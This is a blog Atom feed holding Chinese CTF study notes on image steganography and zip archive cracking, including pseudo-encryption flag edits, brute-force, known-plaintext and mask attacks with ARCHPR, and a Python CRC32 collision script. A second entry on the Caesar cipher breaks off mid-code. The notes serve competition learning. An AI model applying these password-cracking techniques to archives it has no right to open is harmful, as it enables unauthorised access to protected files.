<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A.binのBlog</title>
  
  
  <link href="https://abinix.top/atom.xml" rel="self"/>
  
  <link href="https://abinix.top/"/>
  <updated>2021-07-20T14:03:10.944Z</updated>
  <id>https://abinix.top/</id>
  
  <author>
    <name>A.bin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Misc学习笔记</title>
    <link href="https://abinix.top/2021/07/17/MISC%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/17/MISC%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-17T13:11:34.000Z</published>
    <updated>2021-07-20T14:03:10.944Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">Misc学习笔记</h1><h2 id="😺图片隐写"><a href="#😺图片隐写" class="headerlink" title="😺图片隐写"></a>😺图片隐写</h2><ul><li><h3 id="🎈Exif信息隐藏"><a href="#🎈Exif信息隐藏" class="headerlink" title="🎈Exif信息隐藏"></a>🎈Exif信息隐藏</h3><ul><li><h4 id="Exif是什么？"><a href="#Exif是什么？" class="headerlink" title="Exif是什么？"></a>Exif是什么？</h4><blockquote><p>​        Exif就是用来记录拍摄图像时的各种信息：图像信息（厂商，分辨率等），相机拍摄记（ISO，白平衡，饱和度，锐度等），缩略图（缩略图宽度，高度等），gps（拍摄时的经度，纬度，高度）等，将这些信息按照JPEG文件标准放在图像文件头部。</p></blockquote></li></ul></li></ul><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ac229d5c2.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ac22bfffe.jpg"></td></tr></table><p>​            如上图上述的信息都可以隐藏信息，我们可以通过<strong>右键属性</strong>，<strong>查看详细信息</strong>，也可以通过<a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a> 在线exif中查看</p><ul><li><h3 id="🎈图片修复式隐写"><a href="#🎈图片修复式隐写" class="headerlink" title="🎈图片修复式隐写"></a>🎈图片修复式隐写</h3><ul><li><p>此隐写可分为<strong>图片头修复</strong>、<strong>图片尾修复</strong>、<strong>长宽高修复</strong></p></li><li><h4 id="文件头文件尾总结"><a href="#文件头文件尾总结" class="headerlink" title="文件头文件尾总结"></a>文件头文件尾总结</h4><blockquote><p>JPEG (jpg)，            文件头:FFD8FF　　文件尾: FFD9　　　　　　　　　　　　　　　<br>PNG (png)，           文件头:89504E470D0A1A0A　文件尾:AE 42 60 82<br>GIF (gif)，               文件头:47494638　文件尾:00 3B             </p><p>ZIP Archive (zip)， 文件头:504B0304　文件尾：50 4B</p><p>TIFF (tif)，               文件头:49492A00　<br>Windows Bitmap (bmp)，      文件头：424D<br>CAD (dwg)，           文件头：41433130<br>Adobe Photoshop (psd)，      文件头：38425053　<br>Rich Text Format (rtf)，           文件头：7B5C727466　<br>XML (xml)，                             文件头：3C3F786D6C　<br>HTML (html)，                          文件头：68746D6C3E<br>Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，           文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，    文件头：D0CF11E0<br>MS Access (mdb)，                   文件头：5374616E64617264204A<br>WordPerfect (wpd)，                 文件头：FF575043<br>Adobe Acrobat (pdf)，              文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>Windows Password (pwl)，      文件头：E3828596</p><p>RAR Archive (rar)，                   文件头：52617221<br>Wave (wav)，                           文件头：57415645<br>AVI (avi)，                                 文件头：41564920<br>Real Audio (ram)，                   文件头：2E7261FD<br>Real Media (rm)，                    文件头：2E524D46<br>MPEG (mpg)，                        文件头：000001BA<br>MPEG (mpg)，                        文件头：000001B3<br>Quicktime (mov)，                  文件头：6D6F6F76<br>Windows Media (asf)，           文件头：3026B2758E66CF11<br>MIDI (mid)，                            文件头：4D546864</p></blockquote></li><li><h4 id="图片头尾修复"><a href="#图片头尾修复" class="headerlink" title="图片头尾修复"></a>图片头尾修复</h4><p>在一些ctf题目中，出题人会把图片的<strong>文件头或是文件尾去掉</strong>，这时我们就要<strong>手动添加</strong>文件头，尾。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7edad6ecec.jpg"></p><p>如图，我们加上文件头后即可查看图片</p></li><li><h4 id="长宽高修复"><a href="#长宽高修复" class="headerlink" title="长宽高修复"></a>长宽高修复</h4><p>一般会有一些信息隐藏在图片的下面，但由于图片<strong>高度限定</strong>，导致我们看不见，这时我们便可以通过<strong>更改宽高</strong>的方法进行修复。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ba0f3a417.jpg"></p><p>如上图我们更改图片的高度</p><p>在 unit32 height 中修改高度，改的高一点即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7ba0a06d5d.jpg"></p><p>于是flag就出来了</p></li></ul></li><li><h3 id="🎈隐藏信息到十六进制区域"><a href="#🎈隐藏信息到十六进制区域" class="headerlink" title="🎈隐藏信息到十六进制区域"></a>🎈隐藏信息到十六进制区域</h3><ul><li><p>因为在<strong>文件尾添加一串编码</strong>并不会影响显示，所以一些赛题会采用这样的方式隐藏</p></li><li><p>或者会把flag藏到文本里，这时我们 <strong>ctrl+f</strong> 进行搜索即可。</p></li></ul><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e82b2a8383f.jpg"></td><table></li><li><p>如上图，我们用010打开后发现文件尾有一串编码，分析后得知该编码为<strong>Unicode</strong></p><p>我们用在线网站 <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a> </p><p>即可得到flag</p></li><li><h3 id="🎈LSB隐写"><a href="#🎈LSB隐写" class="headerlink" title="🎈LSB隐写"></a>🎈LSB隐写</h3><ul><li><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p>LSB全称为 least significant bit，是最低有效位的意思。Lsb图片隐写是基于lsb算法的一种图片隐写术。机器并不是通过像素识别，而是通过该像素点的数值大小识别，所以在人类眼中一样的，在机器那不一样。一个像素点占8位，每位有3个颜色，每个像素点能隐藏3个信息。</p><p>所以低有效位的数据改变在人眼看来是一样的，<strong>所以在最后一位隐藏数据是一个有效的方法。</strong></p></blockquote></li><li><p>对于lsb隐写 我们用<strong>Stegsolve.jar</strong>工具查看即可</p><p>打开点击Stegsolve.jar工具 点击 Analyse 再点击 Data Extract</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f1b2f1f11.jpg"></p><p>因为是LSB，<strong>利用最低有效位</strong>，所以我们将<strong>RGB的色素</strong>都调为0 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f274792a6.jpg"></p><p>即可得到一些信息</p></li></ul></li><li><h3 id="🎈Jphide隐写"><a href="#🎈Jphide隐写" class="headerlink" title="🎈Jphide隐写"></a>🎈Jphide隐写</h3><ul><li><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><blockquote><p>Jphide是基于最低有效位LSB的<strong>JPEG</strong>格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。</p></blockquote></li><li><p>我们采用<strong>JPHS</strong>软件解密（用于对 JPEG 文件进行 Jhide 算法的隐写或提取）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e7f909852ff.jpg"></p><p>点击hide 输入对应密码即可解密。（有些也可不输）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9292791efb.jpg"></p><p>输入完毕则会在桌面上创建一个文件。内容则是隐藏的信息</p></li></ul></li><li><h3 id="🎈outguess隐写"><a href="#🎈outguess隐写" class="headerlink" title="🎈outguess隐写"></a>🎈outguess隐写</h3><ul><li><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><blockquote><p>Outgusee算法是Niels Provos针对Jsteg算法的缺陷提出的一种方法：</p><p>对应的，也有针对该算法的隐写工具，名字也叫Outguess。</p></blockquote></li><li><h4 id="安装outguess"><a href="#安装outguess" class="headerlink" title="安装outguess"></a>安装outguess</h4><ol><li><p>Kail终端命令输入<code>git clone https://github.com/crorvick/outguess</code></p></li><li><p>下载完毕进入outguess文件夹中</p></li><li><p>在终端中输入<code>./configure &amp;&amp; make &amp;&amp; make install</code> 即可安装</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e963ed73b0a.jpg"></p></li></ol><p>如上图已经安装完毕，输入<strong>outguess</strong>可查看指令</p><ul><li><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p><code>outguess -r “图片位置” -t 11.txt</code></p><p>其中 r 为解密指令</p><p>11.txt 为导出的文件</p><p>如下图为成功结果</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c9adf0b5d.jpg"></p></li></ul></li><li><h3 id="🎈F5隐写"><a href="#🎈F5隐写" class="headerlink" title="🎈F5隐写"></a>🎈F5隐写</h3><blockquote><p>F5隐写全称F5-steganography，</p><p>在kail系统命令端输入以下代码来下载：</p><p><code>git clone https://github.com/matthewgao/F5-steganography</code></p></blockquote></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e96bb308de3.jpg"></p><p>​        如图：可以看到左边生成了一个名为F5的文件包</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e96f66dd6b0.jpg"></p><p>​        结果一看 使用不了，<strong>需要java环境</strong>，那好吧 整一个。</p><ul><li><h4 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h4><ul><li><p>去java官网下载jdk，然后粘贴到虚拟机中  <a href="https://www.oracle.com/java/technologies/javase-jdk16-downloads.html">https://www.oracle.com/java/technologies/javase-jdk16-downloads.html</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9b2e04e267.jpg"></p></li><li><p><strong>因为kali自带的java版本是Openjdk，因此需要卸载，在终端中输入命令</strong><code>apt-get remove openjdk*</code></p></li><li><p>将不再需要的<strong>java软件卸载</strong>，输入命令：<code>apt autoremove</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9b4366e8cb.jpg"></p></li></ul><ul><li><p>然后<strong>解压缩并移动至/opt文件夹</strong></p><blockquote><p><code>cp jdk-16.0.1_linux-x64_bin.tar.gz /opt</code>将压缩包移动至/opt文件夹</p><p><code>tar -xvzf jdk-16.0.1_linux-x64_bin.tar.gz</code>将压缩包解压至当前文件夹</p><p><code>cd jdk-16.0.1</code>进入解压好的文件夹</p></blockquote></li><li><p><strong>设置环境变量</strong>  <code>vi  /etc/profile</code> </p><p>并在尾部加入如下信息</p><blockquote><p>#install JAVA JDK</p><p>export JAVA_HOME=/opt/jdk-16.0.1</p><p>export CLASSPATH=.:${JAVA_HOME}/lib</p><p>export PATH=${JAVA_HOME}/bin:$PATH </p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9bbf1c1ec9.jpg"></p></li><li><p>接下来<strong>安装并注册</strong> 依次输入下列命令</p><blockquote><p>update-alternatives –install /usr/bin/java java /opt/jdk-16.0.1/bin/java 1<br>update-alternatives –install /usr/bin/javac javac /opt/jdk-16.0.1/bin/javac 1<br>update-alternatives –set java /opt/jdk-16.0.1/bin/java<br>update-alternatives –set javac /opt/jdk-16.0.1/bin/javac</p></blockquote></li><li><p>完毕后，输入<code> java -version</code>查看是否安装完毕，如果出现以下结果则表示安装完毕</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9bba29d530.jpg"></p></li></ul></li><li><h4 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h4><ol><li><p>cd到安装目录下</p></li><li><p>输入<code>java Extract “待提取的图片路径”</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c44f0b4e4.jpg"></p><p>还是出现了错误 </p><h5 id="心态炸了🧨"><a href="#心态炸了🧨" class="headerlink" title="心态炸了🧨"></a>心态炸了🧨</h5><p>网上一查发现是因为我<strong>jdk版本太高而在较低版本的文件下运行造成的</strong> </p><h5 id="靠🧨"><a href="#靠🧨" class="headerlink" title="靠🧨"></a>靠🧨</h5><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c49fc3b20.jpg"></p><p>行吧，那我在<strong>windows</strong>里下，windows里jdk版本<strong>低</strong>，好趴</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c50679296.jpg"></p><p>输入<code>java Extract “待提取的图片路径”</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9c58820773.jpg"></p><h5 id="终于完成了-我的天"><a href="#终于完成了-我的天" class="headerlink" title="终于完成了 我的天"></a>终于完成了 我的天</h5><h5 id="解密结果会在当前文件夹的-output-txt-中"><a href="#解密结果会在当前文件夹的-output-txt-中" class="headerlink" title="解密结果会在当前文件夹的 output.txt 中"></a>解密结果会在当前文件夹的 output.txt 中</h5><p>结束 F5 </p></li></ol></li><li><h3 id="🎈盲水印隐写"><a href="#🎈盲水印隐写" class="headerlink" title="🎈盲水印隐写"></a>🎈盲水印隐写</h3><ul><li><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><blockquote><p>隐藏式的水印是以数字数据的方式加入音频、图片或影片中,但在一般的状况下无法被看见。</p><p>当有两张图片一模一样时，多半是盲水印加密过的</p></blockquote><p>这里我们用到 <strong>blind-watermark</strong>工具解密</p></li><li><h4 id="安装cv2库"><a href="#安装cv2库" class="headerlink" title="安装cv2库"></a>安装cv2库</h4><p>**这个工具需要安装 cv2 的库 **</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e9ce7115fa2.jpg"></p><p>​    使用命令安装<code>pip install opencv-python</code></p><p><strong>在安装这个库的时候试错了无数次，一直显示没有模板cv2，在网上也查找了许多资料，但都无法解决，无奈之下只能在windows环境下部署</strong></p><p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a> 安装盲水印工具，</p><p>并放入python <strong>site-packages</strong>文件下</p><ul><li><h4 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h4><p>这一部分<strong>也试错了许多，</strong>因为我是在python3环境下解密的，所以在使用常用的命令解密时，会出现下图的情况</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebc8413d38b.jpg"></p><p>查找大量资料才知道，<strong>主要原因是python2和python3 random的算法不同，如果要让python3兼容python2的random算法请加 <code>--oldseed</code>参数。</strong></p><p>以下为<strong>python3</strong>解密：</p><p>首先cd到盲水印工具安装目录下，然后输入</p><p><code>python bwmforpy3.py decode 0.png 1.png flag.png --oldseed</code></p><p>0.png 和 1.png为两张相同的图片</p><p>flag.png为解密后的结果</p></li></ul><p>​        运行脚本后提取查看解密结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebca13c78c7.jpg"></p></li></ul><h2 id="😺压缩包破解"><a href="#😺压缩包破解" class="headerlink" title="😺压缩包破解"></a>😺压缩包破解</h2><ul><li><h3 id="🎈伪加密"><a href="#🎈伪加密" class="headerlink" title="🎈伪加密"></a>🎈伪加密</h3><ul><li><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4></li></ul></li></ul><blockquote><p>zip伪加密是在<strong>文件头的加密标志位做修改</strong>，进而再打开文件时识被别为加密压缩包。</p><p><strong>一个 ZIP 文件由三个部分组成：</strong></p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p></blockquote><p>而伪加密就是在<strong>压缩源文件目录区</strong>中进行修改数据达到伪加密的效果。</p><p>把 <em><strong>压缩源文件目录区</strong></em> 的 <strong>全局方式位标记</strong>  的 01 00 或 09 00 改为 00 00  就可以<strong>去除</strong>密码</p><p>把 <em><strong>压缩源文件目录区</strong></em> 的 <strong>全局方式位标记</strong>  的 00 00 改为  01 00 或 09 00  就可以<em><strong>添加</strong></em>密码 </p><p>经验告诉我一般是在<strong>倒数第二个</strong>的文件头中更改。找到文件头第九第十个字符，将其修改为0000<strong>即可解密</strong></p><h5 id="🤦‍♂️举个栗子吧"><a href="#🤦‍♂️举个栗子吧" class="headerlink" title="🤦‍♂️举个栗子吧"></a>🤦‍♂️举个栗子吧</h5><p>我们用010打开压缩包</p><p>然后用ctrl+f进行寻找文件头为 504B0102的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd0be4227c.jpg"></p><p>然后我们将第九个字符改为09</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd073f1a4d.jpg"></p><p>如下图可发现 压缩包已经上锁了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ebd1a199874.jpg"></p><p>如果要打开，也是同样的道理，将09改为00即可</p><ul><li><h3 id="🎈字典爆破（暴力）"><a href="#🎈字典爆破（暴力）" class="headerlink" title="🎈字典爆破（暴力）"></a>🎈字典爆破（暴力）</h3><blockquote><p>暴力破解就是选择密码范围,长度等,由软件组合生成密码进行爆破</p></blockquote></li></ul><p>这里我们用到windows下的软件 advanced zip password recovery</p><p>我们将软件打开后，选择统计类型为<strong>暴力</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed5577adb81.jpg"></p><p>设置完毕后点击开始，即开始爆破</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed559ea345c.jpg"></p><p>如图，暴力破解已找到答案</p><ul><li><h3 id="🎈明文攻击"><a href="#🎈明文攻击" class="headerlink" title="🎈明文攻击"></a>🎈明文攻击</h3><p>明文攻击真的学到了超级多知识</p><ul><li><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><blockquote><p>所谓明文攻击就是已经通过其他手段知道zip加密文件中的某些内容，比如在某些网站上发现它的readme.txt文件，或者其他文件，这时就可以尝试破解了</p></blockquote></li><li><h4 id="前提！！"><a href="#前提！！" class="headerlink" title="前提！！"></a>前提！！</h4><p><strong>明文文件要和加密文件的格式相同，所以这里需要压缩–这里一定要注意我们的压缩方式要相同</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed3e3920ff9.jpg"></p></li></ul></li></ul><h4 id="👱‍♂️举个例子"><a href="#👱‍♂️举个例子" class="headerlink" title="👱‍♂️举个例子"></a>👱‍♂️举个例子</h4><p>​        如图 下面是一个压缩包 但是我们可以发现，里面还有一个11.zip，并且内容也是加密的，但是我们已知一张图片，可以看到这张图片的<strong>CRC值和压缩包里面的图片CRC值一样</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed02234d6dc.jpg"></p><p>​        接下来我们放入 ARCHPR 中进行明文攻击，如下图，注意几个框框</p><p>​        <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed3f3f5b092.jpg"></p><p>注意：虽然显示一直在爆破，但我们只要<strong>中断爆破</strong>，然后就会弹出一个压缩包，这时已经解密成功了。</p><table><tr><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4058ccd2d.jpg"></td><td><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed40699ce45.jpg"></td></tr></table><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed40979661f.jpg"></p><ul><li><h3 id="🎈掩码攻击"><a href="#🎈掩码攻击" class="headerlink" title="🎈掩码攻击"></a>🎈掩码攻击</h3><p>我的理解：  当我们记得密码的部分，或者几个字符或者长度时，这时我们可以用掩码攻击来爆破，穷举。</p><p>这里我们还是用到  ARCHPR  软件</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4a51ed8c5.jpg"></p><p>​    如图 从注释中我们得知 password 为：jhc????!@#$</p><p>​    <strong>很显然掩码攻击，如下图，注意框框中的信息。</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4af5a36e1.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4b620eddc.jpg"></p><p>​        解密结果已经出来</p><ul><li><h3 id="🎈CRC32碰撞"><a href="#🎈CRC32碰撞" class="headerlink" title="🎈CRC32碰撞"></a>🎈CRC32碰撞</h3><ul><li><h5 id="4位字节CRC32碰撞"><a href="#4位字节CRC32碰撞" class="headerlink" title="4位字节CRC32碰撞"></a>4位字节CRC32碰撞</h5><p>简单地说就是在一个压缩包中，有<strong>两个加密文件字节</strong>是一样的，而文件的内容只有相同的时候，他的crc校验才会一样，这时我们可以通过获取他的crc32值来与我们的内容<strong>计算得到的值</strong>进行相互比较。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed4e1bd25fe.jpg"></p></li></ul><p>​        上脚本！！ 此脚本具有<strong>多线程</strong></p><p>​        </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc</span>(<span class="params">_crc</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    dic = string.printable</span><br><span class="line">    _<span class="built_in">input</span> = _crc</span><br><span class="line">    _<span class="built_in">input</span> = <span class="string">&quot;0X&quot;</span> + _<span class="built_in">input</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + n + h + m</span><br><span class="line">                    s = s.encode()</span><br><span class="line">                    <span class="comment"># print(str(binascii.crc32(s)), _input)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hex</span>(binascii.crc32(s)).upper() == _<span class="built_in">input</span>.upper():</span><br><span class="line">                        <span class="built_in">print</span>(_crc, <span class="string">&#x27;:&#x27;</span>, s.decode())</span><br><span class="line">                        <span class="built_in">print</span>(l)</span><br><span class="line">                        sys.exit()  <span class="comment">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class="line">                    l = l + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class="line">    _thread = []</span><br><span class="line">    _args = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入参数&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="number">1</span>, end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        _args.append(<span class="built_in">input</span>())</span><br><span class="line">    <span class="comment"># print(_args)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class="line">        _thread.append(t) <span class="comment">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class="line">    <span class="comment"># print(_thread)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].join()</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crc32()</span><br></pre></td></tr></table></figure><p>结果如下，Asr3 和 Tp01 则分别是两个txt文件的内容，拼起来即是压缩包密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed5149c3eef.jpg"></p><ul><li><h5 id="6位字节CRC32碰撞"><a href="#6位字节CRC32碰撞" class="headerlink" title="6位字节CRC32碰撞"></a>6位字节CRC32碰撞</h5></li></ul><p>相比于4字节，6字节会更难爆破一些，我在github上找了个工具</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed52a367df5.jpg"></p><p>在windows命令行中进入crc32文件夹中</p><p><strong>输入命令 <code>python crc32.py reverse 0x（为文件CRC32值）</code></strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60ed53252397f.jpg"></p><p>如图我们已经将txt密码穷举出来了，这代表碰撞成功，接下来就是进行密码穷举，然后爆破，这里不多赘述了</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;Misc学习笔记&lt;/h1&gt;

&lt;h2 id=&quot;😺图片隐写&quot;&gt;&lt;a href=&quot;#😺图片隐写&quot; class=&quot;headerlink&quot; title=&quot;😺图片隐写&quot;&gt;&lt;/a&gt;😺图片隐写&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;🎈Ex</summary>
      
    
    
    
    <category term="-Misc" scheme="https://abinix.top/categories/Misc/"/>
    
    
  </entry>
  
  <entry>
    <title>密码学学习笔记</title>
    <link href="https://abinix.top/2021/07/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-09T08:46:33.000Z</published>
    <updated>2021-07-20T13:47:37.331Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">密码学学习笔记</h1><h2 id="🐕凯撒密码"><a href="#🐕凯撒密码" class="headerlink" title="🐕凯撒密码"></a>🐕凯撒密码</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>凯撒密码是最早的代换密码，使用单表代换。其基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文。例如，<strong>当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。</strong> <strong>位数</strong>就是凯撒密码加密和解密的密钥。<br><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214247.png"></p><p>举个栗子：如果要对“zhaobin”这几个字符加密 设偏移量为 3，则我们对应ascii码进行位移</p><ul><li><p>z-&gt;w</p></li><li><p>h-&gt;e</p></li><li><p>a-&gt;x</p></li><li><p>o-&gt;l</p></li><li><p>b-&gt;y</p></li><li><p>i-&gt;f</p></li><li><p>n-&gt;k</p><p>这样就将“zhaobin”加密为了“wexlyfk”，这就是凯撒</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214423.png"></p><h3 id="对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）"><a href="#对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）" class="headerlink" title="对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）"></a>对于凯撒的解密，我们可以用脚本也可以用工具，python脚本如下（纯字母）</h3><p>此题偏移量为3，所以代码中my为3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = 